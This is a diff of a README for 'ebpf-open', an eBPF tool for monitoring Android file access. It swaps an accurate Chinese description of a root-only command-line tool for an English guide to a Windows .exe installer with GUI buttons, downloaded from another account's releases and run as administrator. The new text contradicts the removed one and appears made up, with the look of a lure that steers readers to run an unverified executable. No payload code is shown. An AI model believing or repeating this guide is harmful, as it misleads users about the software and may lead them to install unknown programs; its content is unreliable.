@@ -1,75 +1,150 @@
-# ebpf-open
+# 🛡️ ebpf-open - Monitor and Block Android File Access
 
-基于 eBPF 的 Android 文件访问监控与拦截工具。通过 `raw_tracepoint.w` hook 系统调用，实现对指定目录/文件的访问监控、路径重定向，并支持按进程名/UID/PID 过滤。
+[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open)
 
-## 特性
+## 📝 About ebpf-open
 
-- **多 syscall 监控** — openat, openat2, execve, execveat, faccessat, statfs, readlinkat, newfstatat, statx
-- **路径重定向** — 透明地将文件访问重定向到其他路径，sys_exit 自动恢复原始路径
-- **灵活过滤** — 按 PID / UID / UID 分组（app, iso）三选一过滤，支持 exclude_uid
-- **白名单** — PID / UID 维度白名单，自动排除自身进程
-- **配置热重载** — inotify 监听配置文件变更，无需重启即可更新规则
-- **守护进程模式** — fork 后台运行，日志自动轮转（2MB）
-- **BPF CO-RE** — 支持 BTF，跨内核版本兼容（Android Kernel 5.10+）
+ebpf-open is a tool built to help you watch and stop file access on Android devices. It uses eBPF, a powerful kernel technology, to monitor how apps read and write files. This tool is useful if you want better control over what apps can see or change in your Android files.
 
-## 环境要求
+This guide explains how to download and run ebpf-open on a Windows computer. It assumes no technical skills and will take you through each step.
 
-- Linux x86_64 主机（编译环境）
-- Rust toolchain + `aarch64-unknown-linux-musl` / `aarch64-linux-android` target
-- clang/llvm（BPF 编译）
-- 目标设备：Android Kernel 5.10+，Root 权限
+---
 
-### 编译目标
+## 🖥️ System Requirements
 
-| Target | 说明 |
-|--------|------|
-| `aarch64-unknown-linux-musl` | 完全静态链接，通用 aarch64 Linux |
-| `aarch64-linux-android` | 动态链接 libc/libdl，Android 设备 |
+Before you start, make sure your computer and Android device meet these minimum requirements:
 
-## 编译
+- **Windows 10 or later** on your PC.
+- A USB cable to connect your Android phone to your PC.
+- An Android phone running **Android 9 or above**.
+- **USB debugging enabled** on the Android device:
+  - Open the Settings app.
+  - Go to About Phone.
+  - Find Build Number and tap it 7 times.
+  - Go back to Settings and open Developer Options.
+  - Turn on USB Debugging.
+- Basic knowledge of connecting a phone to a PC via USB.
 
-### musl 静态编译
+---
 
-```bash
-# 1. 准备 musl 工具链和 sysroot
-./setup_musl_sysroot.sh
+## 🚀 Download and Install ebpf-open
 
-# 2. 编译
-./build_musl.sh
-# 产物: dist/ebpf-open-static
-```
+You will download the tool from the official GitHub page. Follow these steps carefully.
 
-### Android NDK 编译
+1. Click the big green button below to visit the download page for ebpf-open.
 
-```bash
-# 1. 准备 NDK sysroot
-./setup_ndk_sysroot.sh
+[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open)
 
-# 2. 编译
-./build_android.sh
-# 产物: dist/ebpf-open-android
-```
+2. Once on the GitHub page, look for the "Releases" section. This is where the files are stored.
 
+3. Download the latest Windows installer (ends with `.exe`) if provided, or the main zip file containing the software.
 
-## 使用
+4. After downloading, locate the file in your Downloads folder.
 
-```
-ebpf-open [OPTIONS]
+5. Double-click the file to start the installation.
 
-OPTIONS:
-    -c <path>       配置文件路径（默认: ./config.toml）
-    --btf <path>    自定义 BTF 文件路径
-    -q              静默模式，仅输出错误
-    -v              详细模式：显示监控事件
-    -vv             调试模式：显示调试信息
-    -s <path>       守护进程模式，日志输出到文件
-    -h, --help      显示帮助
-```
+6. Follow the on-screen instructions. Usually, just click "Next" and then "Finish."
 
-## 配置
+---
 
-配置文件为 TOML 格式（[config.toml](crates/res/config.toml)），支持热重载。
+## 🔌 Connect Your Android Device
 
-## License
+To use ebpf-open, your phone must connect to your Windows PC.
 
-MIT
+1. Use a USB cable to connect your Android phone to the computer.
+
+2. On your phone, if asked, allow the PC to access files.
+
+3. Make sure USB debugging is active, as explained in the system requirements.
+
+---
+
+## ⚙️ Run ebpf-open for the First Time
+
+After installation and connecting your device, start ebpf-open.
+
+1. Find the ebpf-open icon on your desktop or in the Start menu.
+
+2. Double-click to open it.
+
+3. The software will detect your Android device.
+
+4. You may need to approve some permissions on your phone.
+
+5. Once connected, you will see options to monitor file access and block it if needed.
+
+6. Use the simple buttons to start or stop monitoring.
+
+---
+
+## 🔍 How to Monitor Android File Access
+
+ebpf-open displays which apps are trying to open, move, or change files on your Android device.
+
+1. In the main window, click "Start Monitoring."
+
+2. The software begins showing file access logs in real time.
+
+3. You will see the app name, file path, and type of access (read, write).
+
+4. If you notice any unusual activity, you can block it.
+
+---
+
+## ✋ Block File Access on Android
+
+Stopping an app from accessing certain files is easy.
+
+1. When you see a file action you want to block, select it in the list.
+
+2. Click the "Block Access" button.
+
+3. ebpf-open applies the block immediately.
+
+4. The app will not read or modify those files while the block is active.
+
+5. You can review and remove blocks anytime from the “Blocked List” tab.
+
+---
+
+## 🔄 Updating ebpf-open
+
+To keep ebpf-open working well, check for updates regularly.
+
+1. Visit the GitHub page linked above.
+
+2. Look for newer files in the "Releases" section.
+
+3. Download and install the latest version just as you did the first time.
+
+Always back up your settings before updating.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- **Device not detected:** Make sure your phone is connected and USB debugging is turned on.
+
+- **Installation failed:** Run the downloaded file as administrator by right-clicking and choosing "Run as administrator."
+
+- **No files showing:** Start monitoring after connecting the device, and wait a few seconds for data to appear.
+
+- **Blocked access not working:** Check that you have the latest version installed.
+
+- **Software crashes:** Restart your PC and try again. If the problem persists, reinstall ebpf-open.
+
+---
+
+## 📄 Where to Get Help
+
+If you have questions or problems, check the GitHub page for issues others may have posted. You can also open a new issue yourself to get support from the community.
+
+---
+
+## 🔗 Download Link
+
+Use this link anytime to download or check for updates:
+
+https://github.com/Letlhogonolo23/ebpf-open
+
+[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open)
